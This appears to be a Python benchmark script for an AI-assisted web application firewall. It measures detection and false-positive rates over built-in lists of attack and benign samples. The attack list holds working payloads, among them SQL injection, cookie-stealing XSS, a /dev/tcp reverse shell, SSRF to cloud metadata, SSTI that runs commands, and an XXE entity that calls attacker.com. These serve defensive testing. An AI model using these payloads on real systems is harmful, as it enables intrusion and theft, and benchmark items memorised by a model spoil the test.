"""AI 研判层离线评测：攻击样本检出率 / 正常样本误报率 / 规则质量 / 延迟。

用途：为「AI 补漏」这一层建立可量化的基准。每次改粗筛、prompt、模型后重跑，
对比数字即可判断改动是否有效。

用法：
    python -m aiwaf.benchmark                 # 全量（攻击 47 + 正常 22）
    python -m aiwaf.benchmark --category sqli # 只测某类
    python -m aiwaf.benchmark --limit 20      # 只测前 20 条
    python -m aiwaf.benchmark --json bench_out.json  # 结果落盘，便于历史对比

要求：本地 LLM 已启动（默认 http://127.0.0.1:1234）。
"""
import argparse
import json
import re
import time

from . import config
from .engine import MISS_SUSPECT_RE, _fix_broken_regex, _regex_specific_enough, _resolve_rule
from .llm_client import LlmClient

# ---- 攻击样本：(类别, 名称, payload) ----
# 选取原则：以「变形/绕过」为主，模拟雷池第一线规则可能漏判、需要 AI 补漏的场景。
ATTACK_SAMPLES = [
    # SQL 注入
    ("sqli", "union_select", "1 union select username,password from users"),
    ("sqli", "or_true", "1' or '1'='1"),
    ("sqli", "time_sleep", "1 AND sleep(5)"),
    ("sqli", "benchmark", "1' AND BENCHMARK(1000000,SHA1('x'))--"),
    ("sqli", "infoschema", "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0"),
    ("sqli", "waitfor", "1;WAITFOR DELAY '0:0:5'--"),
    ("sqli", "comment_bypass", "admin'--"),
    ("sqli", "url_encoded", "%27%20or%201%3D1%23"),
    ("sqli", "paren_wrap", "1) OR 1=1--"),
    ("sqli", "pg_sleep", "1; SELECT pg_sleep(10);--"),
    # XSS
    ("xss", "svg_onload", "<svg onload=alert(1)>"),
    ("xss", "img_onerror", "<img src=x onerror=alert(document.cookie)>"),
    ("xss", "js_pseudo", "javascript:alert(1)"),
    ("xss", "script_tag", "<script>alert(1)</script>"),
    ("xss", "attr_break", "\"><img src=x onerror=prompt(1)>"),
    ("xss", "body_onload", "<body onload=alert(1)>"),
    ("xss", "iframe", "<iframe src=javascript:alert(1)>"),
    ("xss", "semicolon_inject", "';alert(1);//"),
    # 命令注入
    ("cmdi", "pipe", "|id"),
    ("cmdi", "semicolon", ";whoami"),
    ("cmdi", "dollar_sub", "$(cat /etc/passwd)"),
    ("cmdi", "backtick", "`ls -la`"),
    ("cmdi", "pipe_ping", "|ping -c 10 127.0.0.1"),
    ("cmdi", "double_amp", "&& net user"),
    ("cmdi", "url_encoded_pipe", "%7Cid"),
    ("cmdi", "rev_shell", "1; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
    # 路径穿越
    ("traversal", "dotdot", "../../etc/passwd"),
    ("traversal", "single_enc", "..%2f..%2f..%2fetc%2fpasswd"),
    ("traversal", "dot_slash_mix", "....//....//etc/passwd"),
    ("traversal", "double_enc", "..%252f..%252fetc/passwd"),
    ("traversal", "null_byte", "/etc/passwd%00.jpg"),
    # SSRF
    ("ssrf", "cloud_metadata", "http://169.254.169.254/latest/meta-data/"),
    ("ssrf", "local_redis", "http://127.0.0.1:6379/"),
    ("ssrf", "file_scheme", "file:///etc/passwd"),
    ("ssrf", "gopher", "gopher://127.0.0.1:6379/_INFO"),
    ("ssrf", "metadata_enc_dot", "http://169.254.169.254%2e%2f"),
    # SSTI 模板注入
    ("ssti", "el_expr", "${7*7}"),
    ("ssti", "spel_expr", "#{7*7}"),
    ("ssti", "jinja_expr", "{{7*7}}"),
    ("ssti", "thymeleaf_expr", "@{7*7}"),
    ("ssti", "java_runtime", "${''.class.forName('java.lang.Runtime')}"),
    ("ssti", "python_globals", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("ssti", "nested_el", "${{7*7}}"),
    # XXE / XML
    ("xxe", "entity_inline", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
    ("xxe", "param_entity", "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hosts\"> %file;]>"),
    ("xxe", "oob", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><r>&xxe;</r>"),
    # 反序列化
    ("deser", "php_serialized", "O:8:\"stdClass\":1:{s:1:\"a\";s:3:\"bcd\";}"),
    ("deser", "java_header", "aced0005737200"),
    ("deser", "ysoserial", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA"),
]

# ---- 正常样本：(名称, payload) ----
# 选取原则：大量「长得像攻击」的正常业务（含敏感词、单引号、HTML 富文本、
# URL 编码等），专门用来压误报率——AI 补漏系统最怕的就是这个。
NORMAL_SAMPLES = [
    ("plain_hello", "hello world"),
    ("cn_query", "你好世界&page=2"),
    ("normal_admin_name", "id=123&name=admin"),
    ("keyword_sleep", "sleep"),
    ("keyword_select", "search=select 查询语句示例"),
    ("normal_url_param", "url=https://example.com/page?id=1"),
    ("math_expr", "msg=1+1=2"),
    ("normal_file", "file=report_2026.pdf"),
    ("keyword_class", "query=java.lang.String 类"),
    ("api_path", "path=/api/v1/users?filter=active"),
    ("apostrophe_name", "name=O'Brien"),
    ("normal_logic", "content=we have 2 apples and 1>0 is true"),
    ("admin_redirect", "/admin/login?redirect=/dashboard"),
    ("jsonp_callback", "callback=jsonp_cb&data=1"),
    ("lang_theme", "lang=en-US&theme=dark"),
    ("cn_math_question", "q=1 AND 2=2 这种数学题"),
    ("richtext_html", "<p>这是富文本，含 <b>加粗</b> 与 script 字样说明</p>"),
    ("sku_ids", "sku=1,2,3&cat=electronics"),
    ("date_range", "start=2026-01-01&end=2026-01-31"),
    ("search_cookie_word", "q=document.cookie 是什么含义"),
    ("uuid_param", "token=550e8400-e29b-41d4-a716-446655440000"),
    ("jwt_like", "auth=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"),
]


def _judge_rule_quality(payload, rule):
    """规则质量三关：可编译 / 能命中触发样本 / 过特指性校验。

    与生产链路口径一致：编译失败时先尝试 _fix_broken_regex 修复。
    """
    if not rule:
        return False, "empty"
    fixed = rule
    try:
        re.compile(fixed)
    except re.error as e:
        fixed = _fix_broken_regex(rule)
        if fixed is None:
            return False, "compile: %s" % e
    rx = re.compile(fixed)
    if not rx.search(payload):
        return False, "not-match-sample"
    ok, why = _regex_specific_enough(fixed)
    if not ok:
        return False, "too-broad"
    return True, why


def _analyze(client, payload, host="bench.test"):
    t0 = time.perf_counter()
    a = client.analyze({"host": host, "uri": "/?q=" + payload[:100],
                        "payload": payload})
    ms = (time.perf_counter() - t0) * 1000
    return a, ms


def run(category=None, limit=None):
    client = LlmClient()
    atk = [s for s in ATTACK_SAMPLES
           if category in (None, s[0])]
    norm = [s for s in NORMAL_SAMPLES] if category in (None, "normal") else []
    if limit:
        atk = atk[:limit]
        norm = norm[:limit]

    # ---- 攻击样本 ----
    per_cat = {}
    missed = []
    atk_screened = 0
    latencies = []
    confs = []
    rule_gen = 0
    rule_valid = 0
    rule_bad = []
    e2e_intercepted = 0
    total = len(atk)
    print("== 攻击样本 %d 条 ==" % total, flush=True)
    for i, (cat, name, payload) in enumerate(atk, 1):
        a, ms = _analyze(client, payload)
        latencies.append(ms)
        if MISS_SUSPECT_RE.search(payload):
            atk_screened += 1
        hit = a["verdict"] == "attack" and not a.get("_error")
        c = per_cat.setdefault(cat, {"total": 0, "detected": 0})
        c["total"] += 1
        if hit:
            c["detected"] += 1
            confs.append(a["confidence"])
        else:
            missed.append({"cat": cat, "name": name,
                           "verdict": a["verdict"],
                           "conf": a["confidence"], "why": a["explain"][:80]})
        if hit:
            # 端到端拦截：检出 且 有可落地规则（模型正则优先，失败则字面兜底）
            resolved = _resolve_rule({"payload": payload}, a, sample=payload)
            if resolved:
                e2e_intercepted += 1
        if hit and a.get("suggested_rule"):
            rule_gen += 1
            ok, why = _judge_rule_quality(payload, a["suggested_rule"])
            if ok:
                rule_valid += 1
            else:
                rule_bad.append({"name": name, "rule": a["suggested_rule"][:80],
                                 "why": why})
        print("  [%d/%d] %-6s %-20s -> %-7s conf=%.2f  %dms" %
              (i, total, cat, name, a["verdict"], a["confidence"], ms),
              flush=True)

    detected = sum(c["detected"] for c in per_cat.values())
    print("\n----- 攻击样本汇总 -----")
    print("%-12s %6s %6s %8s" % ("类别", "样本数", "检出", "检出率"))
    for cat, c in sorted(per_cat.items()):
        print("%-12s %6d %6d %7.0f%%" %
              (cat, c["total"], c["detected"],
               100.0 * c["detected"] / c["total"]))
    print("%-12s %6d %6d %7.0f%%" %
          ("合计", total, detected, 100.0 * detected / total))
    avg_ms = sum(latencies) / len(latencies) if latencies else 0
    avg_conf = sum(confs) / len(confs) if confs else 0
    print("平均研判延迟: %.0f ms/条；检出样本平均置信度: %.2f" %
          (avg_ms, avg_conf))
    print("粗筛(MISS_SUSPECT_RE)命中 %d/%d 条（生产链路中，被雷池漏判且粗筛未命中的攻击到不了 LLM）" %
          (atk_screened, total))
    print("规则质量: 生成 %d 条，有效 %d 条（可编译+命中样本+过特指性）" %
          (rule_gen, rule_valid))
    print("端到端拦截率: %d/%d = %.0f%%（检出 且 规则可落地，闭环真实拦截能力）" %
          (e2e_intercepted, total, 100.0 * e2e_intercepted / total))
    if missed:
        print("\n漏检明细:")
        for m in missed:
            print("  - [%s] %s -> %s (%.2f) %s" %
                  (m["cat"], m["name"], m["verdict"], m["conf"], m["why"]))
    if rule_bad:
        print("\n无效规则明细:")
        for b in rule_bad:
            print("  - [%s] %r (%s)" % (b["name"], b["rule"], b["why"]))

    # ---- 正常样本 ----
    fp = []
    total_n = len(norm)
    norm_screened = 0
    print("\n== 正常样本 %d 条 ==" % total_n, flush=True)
    for i, (name, payload) in enumerate(norm, 1):
        a, ms = _analyze(client, payload)
        scr = bool(MISS_SUSPECT_RE.search(payload))
        if scr:
            norm_screened += 1
        if a["verdict"] == "attack" and not a.get("_error"):
            fp.append({"name": name, "conf": a["confidence"],
                       "why": a["explain"][:80], "screened": scr})
        print("  [%d/%d] %-22s -> %-7s conf=%.2f  %dms" %
              (i, total_n, name, a["verdict"], a["confidence"], ms),
              flush=True)
    print("\n----- 正常样本汇总 -----")
    print("误报 %d 条 / %d 条，误报率 %.0f%%" %
          (len(fp), total_n, 100.0 * len(fp) / total_n))
    scr_fp = [f for f in fp if f.get("screened")]
    print("生产视角：粗筛通过 %d 条（会送 LLM），其中误报 %d 条；未过粗筛 %d 条（生产不会研判）" %
          (norm_screened, len(scr_fp), total_n - norm_screened))
    high = [f for f in fp if f["conf"] >= 0.9]
    if high:
        print("其中高置信(>=0.9)误报 %d 条" % len(high))
    for f in fp:
        print("  - [%s] conf=%.2f %s" % (f["name"], f["conf"], f["why"]))

    return {
        "model": client.model,
        "attack": {"total": total, "detected": detected,
                   "rate": round(100.0 * detected / total, 1),
                   "avg_ms": round(avg_ms), "avg_conf": round(avg_conf, 3),
                   "rule_gen": rule_gen, "rule_valid": rule_valid,
                   "e2e_intercepted": e2e_intercepted,
                   "e2e_rate": round(100.0 * e2e_intercepted / total, 1),
                   "screened": atk_screened,
                   "per_cat": per_cat, "missed": missed},
        "normal": {"total": total_n, "false_pos": len(fp),
                   "rate": round(100.0 * len(fp) / total_n, 1) if total_n else 0,
                   "screened": norm_screened,
                   "screened_fp": len(scr_fp),
                   "fp": fp},
    }


def main(argv=None):
    ap = argparse.ArgumentParser(description="AI 研判层离线评测")
    ap.add_argument("--category", help="只测某类（sqli/xss/cmdi/traversal/ssrf/ssti/xxe/deser/normal）")
    ap.add_argument("--limit", type=int, help="只测前 N 条")
    ap.add_argument("--json", help="结果落盘路径，便于历史对比")
    args = ap.parse_args(argv)
    result = run(category=args.category, limit=args.limit)
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        print("\n结果已保存: %s" % args.json)


if __name__ == "__main__":
    main()
